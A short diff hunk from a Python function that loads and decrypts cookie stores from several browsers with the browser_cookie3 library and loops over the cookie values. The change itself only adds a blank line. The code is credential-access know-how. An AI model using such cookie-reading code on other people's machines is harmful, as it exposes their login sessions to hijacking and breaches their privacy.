@@ -395,6 +395,7 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False,
                 elif browser_name == OPERAGX: cookies = browser_cookie3.opera_gx(cookie_file=tcDatPath)
                 elif browser_name == BRAVE_BROWSER: cookies = browser_cookie3.brave(cookie_file=tcDatPath)
                 print(browser_name, tcDatPath, cDatPath)
+
                 for cookie in cookies:
                     decoded = cookie.value
                     # print(f"{cookie.name} ::: {decoded}", '\n')
